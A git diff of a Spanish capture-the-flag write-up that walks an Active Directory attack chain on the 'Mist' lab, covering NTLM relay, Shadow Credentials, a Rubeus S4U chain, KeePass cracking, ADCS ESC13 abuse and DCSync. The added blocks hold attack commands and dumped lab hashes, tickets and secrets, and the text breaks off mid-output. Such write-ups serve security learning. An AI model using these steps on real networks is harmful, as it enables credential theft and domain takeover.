@@ -892,7 +892,7 @@ Tras  configurar  ntlmrelayx  con  soporte  SMB2  a  través  del  túnel  estab
 PetitPotam, especificando nuestra dirección IP como listener y habilitando todas las pipes disponibles para
 maximizar las posibilidades de coerción.
 
-<img src="assets/28.png">
+<img src="assets/29.png">
 
 El análisis de la salida generada por ntlmrelayx confirmó la hipótesis inicial: el ataque fracasó debido a
 que el SMB Signing se encuentra habilitado en el controlador de dominio, lo que impide la retransmisión
@@ -902,7 +902,7 @@ de autenticaciones NTLM capturadas.
 ya  que  dicho  host  no  implementa  SMB  Signing;  sin  embargo,  los  machine  accounts  no  pueden  iniciar
 sesiones interactivas sobre recursos de red, por lo que este vector no resulta aprovechable.
 
-<img src="assets/29.png">
+<img src="assets/30.png">
 
 Ante esta limitación, el foco estratégico se desplazó nuevamente hacia MS01, un sistema ya comprometido,
 pero  sobre  el  cual  aún  no  se  disponía  de  privilegios  elevados.  Una  vía  factible  para  obtener  control
@@ -915,6 +915,8 @@ presenta  una  característica  especialmente  relevante:  al  tratarse  de  una
 incorpora  de  forma  nativa  el  servicio  WebDAV,  componente  integrado  en  IIS. WebDAV  permite  a  los
 clientes  interactuar  con  recursos  remotos  de  forma  análoga  a  los  network  shares,  lo  que  implica  que
 Windows utilizará NTLM o Kerberos para autenticarse automáticamente al acceder a un recurso WebDAV.
+
+<img src="assets/31.png">
 
 Este  detalle  es  crucial.  Si  se  consigue  coaccionar  una  autenticación  NTLM  sobre  HTTP,  el  tráfico
 resultante  puede  ser  retransmitido  hacia  el  controlador  de  dominio  a  través  de  LDAP,  eludiendo  por
@@ -929,9 +931,7 @@ dominio para autenticarse en la red. La manipulación de estas plantillas permit
 controladas  por  el  atacante,  habilitando  autenticación  persistente  y  completamente  sigilosa  como  la
 máquina comprometida.
 
-24 de febrero de 2025
-
-14
+<img src="assets/32.png">
 
 Tras añadir las Shadow Credentials para la cuenta de máquina MS01$, se habilitó la posibilidad de ejecutar
 una cadena S4U (Service-for-User) con el fin de impersonar al usuario Administrator en el propio host
@@ -970,20 +970,20 @@ de  acceso  WebDAV  desde  MS01  hacia  http://example/  generará  automáticam
 NTLM desde la cuenta MS01$, que podrá ser retransmitida al controlador de dominio mediante LDAP,
 permitiendo así completar la cadena de abuso de AD CS y obtener el hash NTLM de la máquina.
 
+<img src="assets/33.png">
+
 El intento inicial de añadir un registro DNS utilizando las credenciales de brandon.keywarp resultó fallido.
 Aunque  en  muchos  dominios  los  usuarios  autenticados  disponen  de  permisos  para  crear  entradas  DNS
 dinámicas, en este entorno dicha capacidad no está habilitada, lo que nos obliga a replantear la estrategia.
 Dado  que  no  podemos  inducir  autenticación  NTLM  hacia  un  recurso  externo  controlado  por  nosotros,
 debemos aprovechar un activo interno bajo nuestro control: MS01.
 
-24 de febrero de 2025
-
-15
-
 La idea consiste en utilizar un puerto arbitrario del propio MS01 —por ejemplo, el 9999— y redirigir todo
 el tráfico entrante en dicho puerto hacia el puerto 80 de nuestra máquina atacante. De este modo, al ejecutar
 PetitPotam contra MS01@9999/whatever, la autenticación NTLM generada por MS01 será reenviada a
 nuestro listener, permitiendo su posterior retransmisión hacia el controlador de dominio.
+
+<img src="assets/34.png">
 
 Para  implementar  esta  redirección,  se  configuró  una  regla  de  port  forwarding  a  través  del  túnel
 previamente  establecido  con  Chisel,  asegurando  que  el  tráfico WebDAV  originado  en  MS01  alcanzara
@@ -995,6 +995,8 @@ proporcionada  por  ntlmrelayx.  Esta  variante  facilita  enormemente  el  proc
 públicas  en  el  atributo  msDS-KeyCredentialLink,  evitando  la  necesidad  de  herramientas  adicionales  o
 modificaciones manuales.
 
+<img src="assets/35.png">
+
 Tras  clonar  el  repositorio  y  preparar  un  entorno  virtual  de  Python,  se  ejecutó  ntlmrelayx.py  desde  el
 directorio examples/, utilizando ProxyChains para enrutar el tráfico a través del túnel. La herramienta se
 configuró para apuntar al servicio LDAPS del controlador de dominio y se habilitó la opción -i con el fin
@@ -1005,16 +1007,16 @@ tuvo éxito: ntlmrelayx  registró la recepción de  una  autenticación  NTLM v
 MS01$, la retransmitió correctamente hacia LDAPS y abrió una shell interactiva en el puerto 11000 de
 nuestra máquina local.
 
-24 de febrero de 2025
-
-16
-
 Al conectarnos mediante nc 127.0.0.1 11000 y ejecutar help, se confirmó la disponibilidad de los comandos
 clear_shadow_creds y set_shadow_creds, incorporados en este fork específico.
+
+<img src="assets/36.png">
 
 Con estas herramientas, procedimos a preparar el entorno para la inyección de Shadow Credentials en la
 cuenta  de  máquina  MS01$,  comenzando  por  eliminar  cualquier  clave  preexistente  mediante
 clear_shadow_creds.
+
+<img src="assets/37.png">
 
 Tras establecer el túnel y disponer de un canal estable hacia el entorno interno, se procedió a obtener el
 hash NTLM de la cuenta de máquina MS01$ utilizando Certipy, aprovechando la infraestructura AD
@@ -1026,9 +1028,7 @@ aproximación más robusta: solicitar un TGT para MS01$ empleando directamente e
 lo  que  permite  autenticarse  mediante  PKINIT  utilizando  la clave  privada que  controlamos  gracias  a  las
 Shadow Credentials.
 
-24 de febrero de 2025
-
-17
+<img src="assets/38.png">
 
 Una vez obtenido un TGT válido para la cuenta de máquina MS01$ mediante PKINIT con el certificado
 PFX generado a partir de las Shadow Credentials, se procedió a utilizar Rubeus para completar la cadena
@@ -1042,6 +1042,34 @@ para el servicio CIFS/ms01.mist.htb. Este ticket, una vez extraído y convertido
 un remote secretsdump contra MS01, permitiendo recuperar el hash NTLM del usuario Administrator y,
 finalmente, establecer una sesión interactiva mediante WinRM.
 
+```text
+PS C:\xampp\htdocs\herramientas> .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:"cisf/ms01.mist.htb" /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP67ldWfLOvOTzKlHRiOSK9QI7pk0k/IDFEvyeT0t8vMBqKQZLTHoiufY+qfmcTpAVSE8L5K9coLrRDjy21SXrmDYx2w4RWUrYf4OwrWvTwfRuP750JOrrAkIu4XT8XCVZt27ZYo/5mac8fcB5hx8Pt847MwIrJ3VJ8kN6TI14YhD3h6qGEYAqhcYs8+vO71pzdjmIHNeo8o3ws0Cfo3aDKrga7AVIpEW0WqTd9HKiwqYLGD3pQCwtfGDhxNJPXbdNZwh7tzyirK1qJ5Z9x8LyhOfLiEgVTvHgHZzk1lO/Nm7PSLKmqDG7G8h2OQOBu4MpobppSW/VXWbrejT22mkeM7yeZsIrNCSgVb3e+3q8FGpl/sul7qTmUMluZmpHBfx2YuPkzNx8cnRCBdJEoBdsGwT0q+6ODci5xq9REHqsUKX6UUAtqYLs1Ld6NzYq/SeRGsHSnXZQvCnZJhAJC0k69VAVYZ07Ojhq9VjjgbHVJuw5atcni1N7JU6eUZ6BrGhxBEdPhblURQwQVgYRKd5/Ha4wy9U9NCp2WM6j5FzW8IS4qJOcTg2wSQmc/2OeODGOqbekFo8Fc/ansLj2wUo98cfrtNvaOkUwmfyZHCr6RSKqiGZyzL834IEr41G0QbrnBjANdKQGxU91Y+PAHcV/5BpXnLI5CiSn8MNyRNNAVx+Y0YWExP9lKRQRO98w28t12gUmS0eZml7cE3g5kr7os21uT/wXWk3mkMuuklSsw77hndy+r6BB0uwbSrFo1t6+V1VfD/NNE4VE+By+Uv/OQazz9bWtes7prVDH5QpqoOc4Wi4080x+NzNpAGwLBKKRv+lkgksvBR+BYMkJSj7k+IJrW2AbtKe76/AKmGVecBEHlvJFYCiqVr686uj1S/lCI6QmUyLSJJyy1zCEqGpx20gpT26C9cGApdyxFdQpL0HqaawXEvLjnCAHrZEMxNt0f6etHaORgxHTg1CYYQ7YiPhXlaeWwuAck5KdqHbpZwf4DTrUeiyMOmqhaD/CXuLThtwNeWvw5hPcWw6QxXPCfkwezEBygZAS2eXqCogvasb5/0ipAdx+wUDcMHml1jCF0haCqnqJnoH9CG+nco32vXwL+iCgpoHY0wIMvFEUl/e6wZpNHlg8vcpboRBoDwULuoYolvHQlI1IW+g8E7wxq0/wDQ3ZpPh61fSR8PahypNsqN/aXvTqMAb6RZ7m0XwCKUHBLmKHmYvacZ9hxmZorJtVPvCAB9llS7UxSE1w63UgZ539geCHkHhcr2MssMBLRqVghJd2EfnhKgciztPedVJdwTZqhrbBhLR3yGxqdl1dTBaoPljlwc0++EXAskONviJdU5n3NRK08QqOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEP5PUZ/9ohnBeNYEN+XgbJahChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI2MDMyNTIxMDE0NVqmERgPMjAyNjAzMjYwNzAxNDVapxEYDzIwMjYwNDAxMjEwMTQ1WqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: S4U
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'ms01$@MIST.HTB'
+[*] Using domain controller: DC01.mist.htb (192.168.100.100)
+[*] Sending S4U2self request to 192.168.100.100:88
+[+] S4U2self success!
+[*] Substituting alternative service name 'cisf/ms01.mist.htb'
+[*] Got a TGS for 'Administrator' to 'cisf@MIST.HTB'
+[*] base64(ticket.kirbi):
+
+      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
+
+```
+
 El resultado fue un ticket Kerberos en formato kirbi, codificado en Base64. Tras extraerlo, se procedió a
 decodificarlo  y  almacenarlo  localmente.  Posteriormente,  se  utilizó  la  herramienta  ticketConverter  de
 Impacket  para  transformar  el  archivo  kirbi  en  un  ccache,  formato  compatible  con  las  herramientas  de
@@ -1051,15 +1079,48 @@ Con  el  ccache  preparado,  se  ejecutó  un  remote  secretsdump  contra  MS01
 servicio  obtenido  mediante  la  cadena  S4U.  Este  procedimiento  permitió  recuperar  el  hash  NTLM  del
 usuario Administrator, consolidando así el acceso privilegiado al host.
 
-24 de febrero de 2025
+```text
+┌──(usuario㉿kali)-[~/HTB/mist/content]
+└─$ KRB5CCNAME=administrator.ticket.ccache proxychains4 -q impacket-secretsdump -k -no-pass administrator@ms01.mist.htb
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
-18
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xe3a142f26a6e42446aa8a55e39cbcd86
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f903787dd064cc1973c3aa4ca4a7c1:::
+svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::
+[*] Dumping cached domain logon information (domain/username:hash)
+MIST.HTB/Brandon.Keywarp:$DCC2$10240#Brandon.Keywarp#5f540c9ee8e4bfb80e3c732ff3e12b28: (2026-03-25 21:10:58+00:00)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+MIST\MS01$:plain_password_hex:cb16820566f9fb41f552b2f7b0abd3ae351b11acc9228978ab522b658aada2ad070c67f142d225de3158729e700628a2280b7cf1e302a9ecface390f78c643a12c88cd169bbd32a21da0cb5ecf3973abf97b672a272f3b4211a6a8b16d588c81c55dadfed9220e5fa9cbbddded550a8158482f9a4d9f045504774c2b5cfbd2f3e3a30c007d77627b47508b21c1b155bd172d1aab46f88c2010d6f746d06e0f298969979ade5a70a0168242eab12d476c4aff9858909b72af4500aad6abb0689d21c3efdcc1e1fc1782096e905c3298cfb64827dd45cd13012c18904323a0b5718ba9b1e4e312bf07e43d2ba705b0bf9c
+MIST\MS01$:aad3b435b51404eeaad3b435b51404ee:94af5b968f6bbe944b70a167188a8017:::
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0xe464e18478cf4a7d809dfc9f5d6b5230ce98779b
+dpapi_userkey:0x579d7a06798911d322fedc960313e93a71b43cc2
+[*] NL$KM
+ 0000   57 C8 F7 CD 24 F2 55 EB  19 1D 07 C2 15 84 21 B0   W...$.U.......!.
+ 0010   90 7C 79 3C D5 BE CF AC  EF 40 4F 8E 2A 76 3F 00   .|y<.....@O.*v?.
+ 0020   04 87 DF 47 CF D8 B7 AF  6D 5E EE 9F 16 5E 75 F3   ...G....m^...^u.
+ 0030   80 24 AA 24 B0 7D 3C 29  4F EA 4E 4A FB 26 4E 62   .$.$.}<)O.NJ.&Nb
+NL$KM:57c8f7cd24f255eb191d07c2158421b0907c793cd5becfacef404f8e2a763f000487df47cfd8b7af6d5eee9f165e75f38024aa24b07d3c294fea4e4afb264e62
+[*] _SC_ApacheHTTPServer
+svc_web:MostSavagePasswordEver123
+[*] Cleaning up...
+[*] Stopping service RemoteRegistry
+```
 
-Finalmente, utilizando dicho hash, se estableció una sesión interactiva sobre WinRM mediante evil-winrm,
+Finalmente, utilizando dicho hash, se estableció una sesión interactiva sobre WinRM mediante evil-winrm,
 obteniendo  control  administrativo  completo  sobre  MS01  y  cerrando  de  forma  exitosa  la  cadena  de
 explotación.
 
-Gaining Access as op_Sharon.Mullard on DC01
+<img src="assets/41.png">
+
+<p align="center"><strong><u>Gaining Access as op_Sharon.Mullard on DC01</u></strong></p>
 
 Durante  la  enumeración  del  sistema  comprometido  con  privilegios  de  Administrator,  se  identificaron
 varios elementos de interés en el directorio de usuario de sharon.mullard. Entre ellos destacaba un archivo
@@ -1067,13 +1128,13 @@ KeePass (.kdbx) denominado sharon.kdbx, junto con dos imágenes almacenadas en l
 Dado que una base de datos KeePass suele contener credenciales de alto valor, se procedió a descargar los
 tres archivos para su análisis local.
 
+<img src="assets/42.png">
+
 El archivo image_20022024.png resultó especialmente relevante: mostraba lo que parecía ser un intento de
 la usuaria de manipular o transformar una contraseña utilizando CyberChef, concretamente aplicando una
 conversión a Base64.
 
-24 de febrero de 2025
-
-19
+<img src="assets/43.png">
 
 Como  primer  intento,  se  utilizó  esta  cadena  directamente  para  desbloquear  la  base  de  datos  KeePass
 mediante keepassxc, pero la operación falló. Un examen más detallado de la imagen reveló que parte de la
@@ -1084,11 +1145,15 @@ Para recuperar los caracteres faltantes, se optó por realizar un ataque de tipo
 utilizando como base la porción conocida de la contraseña. Antes de ello, fue necesario extraer el hash de
 la base de datos KeePass mediante keepass2john, generando un formato compatible con hashcat.
 
+<img src="assets/44.png">
+
 Una  vez  obtenido  el  hash,  se  ejecutó  hashcat  con  una  máscara  adaptada  a  la  estructura  parcial  de  la
 contraseña, permitiendo recuperar la cadena completa tras un proceso de cracking exitoso.
 
 Con la contraseña íntegra ya identificada, se procedió finalmente a desbloquear la base de datos KeePass,
 habilitando el acceso a las credenciales almacenadas en su interior.
+
+<img src="assets/45.png">
 
 Durante la revisión de la base de datos KeePass, se identificó una única entrada que contenía la contraseña
 ImTiredOfThisJob:(.
@@ -1101,14 +1166,14 @@ contraseña correspondía a alguna cuenta válida.
 Como  primer  paso,  se  generó  un  listado  completo  de  usuarios  del  dominio  utilizando  el  módulo
 GetADUsers de Impacket, obteniendo así un inventario exhaustivo de identidades potenciales.
 
-24 de febrero de 2025
-
-20
+<img src="assets/46.png">
 
 Con  el  listado  de  usuarios  disponible,  se  procedió  a  ejecutar  un  ataque  de  password  spraying  mediante
 netexec, proporcionando la contraseña recuperada de la base de datos KeePass. El objetivo era identificar
 cualquier coincidencia válida sin provocar bloqueos de cuenta ni generar ruido innecesario en el entorno.
 El resultado reveló que la contraseña correspondía a la cuenta op_Sharon.Mullard.
+
+<img src="assets/47.png">
 
 Es  importante  destacar  que  esta  identidad  es  distinta  de  la  cuenta  Sharon.Mullard,  lo  que  sugiere  la
 existencia de un usuario operativo o de servicio asociado a la misma persona, pero con un rol diferenciado
@@ -1117,7 +1182,9 @@ dentro del dominio.
 Con estas credenciales válidas, se procedió a establecer una sesión remota contra DC01 mediante WinRM,
 consolidando así acceso directo al controlador de dominio bajo una identidad legítima del entorno.
 
-Gaining control over the svc_ca$ account
+<img src="assets/48.png">
+
+<p align="center"><strong><u>Gaining control over the svc_ca$ account</u></strong></p>
 
 Tras  obtener  acceso  interactivo  al  controlador  de  dominio  mediante  la  cuenta  op_Sharon.Mullard,
 resultaba  imprescindible  volver  a  consultar  BloodHound  para  identificar  posibles  configuraciones
@@ -1126,9 +1193,7 @@ relevante:  como  miembro  del  grupo  OPERATIVES,  la  cuenta  op_sharon.mullar
 ReadGMSAPassword sobre el objeto SVC_CA$, un Group Managed Service Account (gMSA) utilizado
 en el entorno.
 
-24 de febrero de 2025
-
-21
+<img src="assets/49.png">
 
 Los  gMSA  emplean  contraseñas  complejas  generadas  y  rotadas  automáticamente  por Active  Directory,
 diseñadas para ser utilizadas exclusivamente por servicios o equipos autorizados. Estas contraseñas no se
@@ -1145,12 +1210,16 @@ dentro  del  dominio.  Este  tipo  de  cuentas  suele  estar  asociado  a  servi
 presumiblemente relacionados con la infraestructura de certificación (CA)—, lo que abre la puerta a nuevas
 rutas de escalada y control dentro del entorno.
 
-Gaining control over svc_cabackup account
+<img src="assets/50.png">
+
+<p align="center"><strong><u>Gaining control over svc_cabackup account</u></strong></p>
 
 Tras obtener acceso a la cuenta SVC_CA$, resultaba imprescindible volver a consultar BloodHound para
 identificar posibles  rutas adicionales de escalada  asociadas a este nuevo  principal.  El análisis reveló un
 hallazgo  especialmente  significativo:  SVC_CA$  posee  el  privilegio  AddKeyCredentialLink  sobre  la
 cuenta SVC_CABACKUP.
+
+<img src="assets/51.png">
 
 Este permiso es crítico porque permite modificar el atributo msDS-KeyCredentialLink del objeto objetivo,
 lo que habilita la inyección de Shadow Credentials. En la práctica, esto significa que podemos replicar
@@ -1163,21 +1232,21 @@ controlable desde el punto de vista criptográfico. Esto permite ejecutar la mis
 se  utilizó  anteriormente  para  el  usuario  brandon.keywarp,  obteniendo  finalmente  el  hash  NTLM  de  la
 cuenta de servicio.
 
-24 de febrero de 2025
-
-22
-
 Para llevar a cabo esta operación, se empleó Certipy a través de ProxyChains, aprovechando su capacidad
 para gestionar Shadow Credentials y realizar autenticación PKINIT de forma transparente sobre el túnel
 establecido. Certipy automatiza tanto la inyección de claves como la solicitud de TGTs y la ejecución del
 flujo  U2U,  lo  que  simplifica  considerablemente  el  proceso  respecto  a  la  combinación  manual  de
 herramientas utilizada en fases anteriores.
 
-Obtaining Domain Admin Privileges
+<img src="assets/52.png">
+
+<p align="center"><strong><u>Obtaining Domain Admin Privileges</u></strong></p>
 
 Tras  comprometer  la  cuenta  SVC_CABACKUP,  se  revisaron  nuevamente  sus  pertenencias  a  grupos
 mediante  BloodHound,  con  el  objetivo  de  identificar  rutas  adicionales  de  escalada  dentro  de  la
 infraestructura de Active Directory.
+
+<img src="assets/53.png">
 
 El  análisis  reveló  que  SVC_CABACKUP  es  miembro  del  grupo  CERTIFICATE  SERVICES,  un
 conjunto de identidades con privilegios avanzados sobre la infraestructura de certificación del dominio. A
@@ -1186,15 +1255,13 @@ particular la que evalúa plantillas vulnerables a ADCS ESC13 mediante la relaci
 CertTemplates  with  OIDGroupLink.  Esta  consulta  permite  identificar  plantillas  de  certificación  que,
 combinadas con permisos delegados, pueden ser abusadas para obtener privilegios elevados.
 
-24 de febrero de 2025
-
-23
-
 El resultado fue especialmente relevante: los miembros del grupo CERTIFICATE SERVICES pueden
 obtener  membresía  efectiva  en  el  grupo  CERTIFICATE  MANAGERS  abusando  de  la  plantilla
 MANAGERAUTHENTICATION,  la  cual  es  vulnerable  a  ESC13.  Esta  relación  es  crítica,  ya  que
 CERTIFICATE MANAGERS forma parte del grupo CA_BACKUP, ampliando aún más la superficie de
 ataque.
+
+<img src="assets/54.png">
 
 A  su  vez,  los  miembros  del  grupo  CA_BACKUP  pueden  obtener  membresía  en  el  grupo
 SERVICEACCOUNTS  mediante  la  plantilla  BACKUPSVCAUTHENTICATION,  que  también
@@ -1202,14 +1269,14 @@ presenta  vulnerabilidades  asociadas  a  ESC13.  Esta  cadena  de  relaciones  
 forma progresiva a través de la infraestructura de certificación, aprovechando plantillas mal configuradas
 y permisos delegados entre grupos.
 
-24 de febrero de 2025
-
-24
+<img src="assets/55.png">
 
 Finalmente,  el  grupo  SERVICEACCOUNTS  es  miembro  del  grupo  BACKUP  OPERATORS,  un
 conjunto de identidades con privilegios altamente sensibles dentro del dominio, incluyendo la capacidad de
 leer  archivos  protegidos,  manipular  servicios  críticos  y,  en  algunos  casos,  realizar  operaciones  que
 conducen directamente a la toma de control del controlador de dominio.
+
+<img src="assets/56.png">
 
 Tras identificar que la cadena de privilegios derivada de SVC_CABACKUP finalizaba en el grupo Backup
 Operators, se evaluó el impacto real de alcanzar dicho nivel de acceso. Los miembros de este grupo poseen
@@ -1222,59 +1289,145 @@ en  el  abuso  de  ADCS  ESC13,  aprovechando  plantillas  de  certificación  m
 delegadas  entre  grupos.  El  primer  paso  consistió  en  solicitar  un  certificado  para  la  cuenta
 SVC_CABACKUP utilizando la plantilla ManagerAuthentication, vulnerable a ESC13.
 
+<img src="assets/57.png">
+
 La emisión de este certificado otorgó membresía efectiva en el grupo Certificate Managers, habilitando
 el acceso a plantillas adicionales que no estaban disponibles inicialmente.
 
-24 de febrero de 2025
-
-25
+<img src="assets/58.png">
 
 Con este certificado, se obtuvo un TGT mediante PKINIT y se utilizó para solicitar un segundo certificado
 basado en la plantilla BackupSvcAuthentication, igualmente vulnerable a ESC13 y accesible únicamente
 gracias a la membresía adquirida en el paso anterior.
 
+<img src="assets/59.png">
+
 La  emisión  de  este  segundo  certificado  elevó  los  privilegios  efectivos  de  la  cuenta  hasta  el  grupo
 ServiceAccounts, que a su vez deriva en Backup Operators, consolidando así el acceso necesario para
 interactuar con los hives del sistema.
 
+<img src="assets/60.png">
+
 Una  vez  obtenido  el  nuevo  TGT  asociado  a  estos  privilegios,  se  procedió  a  extraer  los  hives  SAM,
 SYSTEM y SECURITY utilizando el módulo reg de Impacket.
+
+<img src="assets/61.png">
 
 Posteriormente, los archivos fueron descargados a través de evil-winrm y procesados localmente mediante
 secretsdump, lo que permitió recuperar los hashes locales del  sistema, incluido  el correspondiente a la
 cuenta de máquina DC01$.
 
-24 de febrero de 2025
+```text
+┌──(usuario㉿kali)-[~/HTB/mist/content]
+└─$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
-26
+[*] Target system bootKey: 0x47c7c97d3b39b2a20477a77d25153da5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+$MACHINE.ACC:plain_password_hex:c68cb851aa6312ad86b532db8103025cb80e69025bd381860316ba55b056b9e1248e7817ab7fc5b23c232a5bd2aa5b8515041dc3dc47fa4e2d4c34c7db403c7edc4418cf22a1b8c2c544c464ec9fedefb1dcdbebff68c6e9a103f67f3032b68e7770b4e8e22ef05b29d002cc0e22ad4873a11ce9bac40785dcc566d38bb3e2f0d825d2f4011b566ccefdc55f098c3b76affb9a73c6212f69002655dd7b774673bf8eecaccd517e9550d88e33677ceba96f4bc273e4999bbd518673343c0a15804c43fde897c9bd579830258b630897e79d93d0c22edc2f933c7ec22c49514a2edabd5d546346ce55a0833fc2d8403780
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0xc78bf46f3d899c3922815140240178912cb2eb59
+dpapi_userkey:0xc62a01b328674180712ffa554dd33d468d3ad7b8
+[*] NL$KM
+ 0000   C4 C5 BF 4E A9 98 BD 1B  77 0E 76 A1 D3 09 4C AB   ...N....w.v...L.
+ 0010   B6 95 C7 55 E8 5E 4C 48  55 90 C0 26 19 85 D4 C2   ...U.^LHU..&....
+ 0020   67 D7 76 64 01 C8 61 B8  ED D6 D1 AF 17 5E 3D FC   g.vd..a......^=.
+ 0030   13 E5 4D 46 07 5F 2B 67  D3 53 B7 6F E6 B6 27 31   ..MF._+g.S.o..'1
+NL$KM:c4c5bf4ea998bd1b770e76a1d3094cabb695c755e85e4c485590c0261985d4c267d7766401c861b8edd6d1af175e3dfc13e54d46075f2b67d353b76fe6b62731
+[*] Cleaning up...
+```
 
 Con el hash NTLM de DC01$ en nuestro poder, se ejecutó un ataque DCSync, solicitando directamente
 los secretos del dominio y obteniendo el hash NTLM del Domain Administrator. Este paso consolidó el
 control total sobre la infraestructura de Active Directory.
 
+```text
+┌──(usuario㉿kali)-[~/HTB/mist/content]
+└─$ proxychains4 -q impacket-secretsdump DC01\$@dc01.mist.htb -hashes :e768c4cf883a87ba9e96278990292260
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
